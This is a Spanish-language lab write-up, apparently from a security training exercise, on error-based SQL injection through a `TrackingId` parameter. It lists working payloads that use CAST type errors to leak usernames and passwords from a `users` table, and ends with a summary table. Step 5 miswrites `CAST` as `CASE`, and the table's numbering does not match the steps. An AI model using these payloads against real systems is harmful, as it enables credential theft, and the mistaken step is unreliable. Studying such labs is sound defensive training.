#  LAB 2 — Inyección SQL Basada en Errores

## Objetivo

Identificar y explotar un punto vulnerable en el parámetro `TrackingId` para provocar errores que revelen información sensible de la base de datos (usuarios y contraseñas).

---

## 1️⃣ Probar error inicial

```bash
TrackingId=Wn5WKnuRUukahftF
```

* **Resultado esperado:** La aplicación responde normalmente, sin error visible.
* **Propósito:** Confirmar que el parámetro es funcional.

---

## 2️⃣ Comprobar si los errores se pueden suprimir con comentario

```bash
TrackingId=Wn5WKnuRUukahftF'--
```

* **Resultado esperado:** No debería devolver error.
* **Interpretación:** Si el error desaparece, el parámetro es vulnerable a inyección SQL basada en comillas.

---

## 3️⃣ Probar con una expresión `AND`

```bash
TrackingId=Wn5WKnuRUukahftF' AND CAST((SELECT 1) AS int)--
```

* **Resultado:**
  `ERROR: argument of AND must be type boolean, not type integer`
* **Interpretación:** El servidor está revelando detalles del motor SQL → **confirmación de vulnerabilidad**.

---

## 4️⃣ Ajustar expresión a tipo booleano

```bash
TrackingId=Wn5WKnuRUukahftF' AND 1=CAST((SELECT 1) AS int)--
```

* **Resultado esperado:** Sin error.
* **Conclusión:** La expresión se evalúa correctamente → el payload se ejecuta dentro de la consulta SQL.

---

## 5️⃣ Intentar extraer nombres de usuario (prueba inicial)

```bash
TrackingId=' AND 1=CASE((SELECT username FROM users) AS int)--
```

* **Posibles resultados:**

  * `ERROR: invalid input syntax for type integer: "administrator"`
  * `ERROR: more than one row returned by a subquery used as an expression`
* **Interpretación:**
  El error confirma que el subquery se ejecuta correctamente, pero devuelve varias filas o devuelve un valor no convertible a entero.

---

## 6️⃣ Reducir espacio: eliminar parte del TrackingId

```bash
TrackingId='
```

* **Observación:** Devuelve un error que sugiere que la consulta se ha ejecutado pero el resultado produjo un tipo/valor inesperado:
  `ERROR: more than one row returned by a subquery used as an expression`

---

## 7️⃣ Forzar la subconsulta a devolver una sola fila (`LIMIT 1`)

```bash
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

* **Resultado:**
  `ERROR: invalid input syntax for type integer: "administrator"`
* **Conclusión:**
  ✅ El error revela el **primer nombre de usuario** (`administrator`).

---

## 8️⃣ Repetir para la contraseña

➡️ **Aquí van los comandos para la contraseña**, repitiendo la estructura anterior pero apuntando a la columna `password`.

Ejemplo de plantilla (rellenar/completar con tus comandos):

```bash
# Aquí van los comandos
# Ejemplo: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

---

## 🧩 Resumen del proceso

| Paso | Acción                        | Resultado                    | Conclusión                         |
| ---- | ----------------------------- | ---------------------------- | ---------------------------------- |
| 1    | Probar `TrackingId` normal    | Sin error                    | Parámetro válido                   |
| 2    | Añadir `'--`                  | Sin error                    | Vulnerable a inyección             |
| 3    | `AND CAST((SELECT 1) AS int)` | Error de tipo                | SQL ejecutado                      |
| 4    | Corregir a booleano           | Sin error                    | Validación pasada                  |
| 5    | Extraer `username`            | Error revela múltiples filas | Subquery ejecutada                 |
| 6    | Añadir `LIMIT 1`              | Error con valor literal      | Usuario encontrado                 |
| 7    | Repetir con `password`        | —                            | Contraseña revelada (si se aplica) |

---


